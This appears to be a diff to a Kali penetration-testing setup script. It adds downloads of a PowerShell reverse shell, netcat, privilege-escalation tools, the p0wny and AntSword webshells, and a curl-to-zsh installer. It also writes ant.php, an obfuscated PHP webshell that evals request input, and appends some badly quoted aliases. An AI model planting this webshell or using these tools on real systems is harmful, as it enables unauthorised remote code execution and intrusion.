@@ -51,6 +51,7 @@ bind -r k select-pane -U # 绑定k为↑
 bind -r j select-pane -D # 绑定j为↓
 bind -r h select-pane -L # 绑定h为←
 bind -r l select-pane -R # 绑定l为→
+set -g mouse on
 # reload config file (change file location to your the tmux.conf you want to use)
 bind r source-file ~/.tmux.conf; display-message "Config reloaded.."
 bind V source-file ~/.tmux/layout1         #ctrl b + shift v => change
@@ -73,7 +74,7 @@ clear
 go install github.com/ropnop/kerbrute@latest
 
 #binary
-mkdir -p tools/binary&&cd tools/binary
+mkdir -p Tools/linux && cd Tools/linux
 sleep 3
 wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
 sleep 2
@@ -82,7 +83,21 @@ cd ../
 mkdir ad&&cd ad
 git clone https://github.com/urbanadventurer/username-anarchy.git
 git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
-
+cd ../
+mkdir windows && cd windows
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
+wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
+wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+cd ../
+mkdir webshell && cd webshell
+wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip
+unzip AntSword-Loader-v4.0.3-linux-x64.zip
+rm -rf AntSword-Loader-v4.0.3-linux-x64.zip
+mv AntSword-Loader-v4.0.3-linux-x64 AntSword
+echo "<?php class G16f8j67 { public function __construct($H6nC8){ @eval("/*Z5934A463v*/".$H6nC8.""); }}new G16f8j67($_REQUEST['cmd']);?>" > ant.php
+sleep 2
 clear
 sleep 2
 pip install bloodyAD
@@ -107,5 +122,13 @@ cat >> ~/.zshrc <<-'EOF'
 export PATH="$PATH:/home/kali/.pyenv/versions/impacket/bin"
 EOF
 
+sleep 2
+clear
+curl -fsSL https://raw.githubusercontent.com/zimfw/install/master/install.zsh | zsh
 clear
 cd ~
+echo "alias cl="clear"" >> .zshrc
+echo "alias impacket="clear"pyenv activate impacket" >> .zshrc
+echo "alias deactivate="source deactivate"" >> .zshrc
+echo "alias cme="crackmapexec"" >> .zshrc
+clear
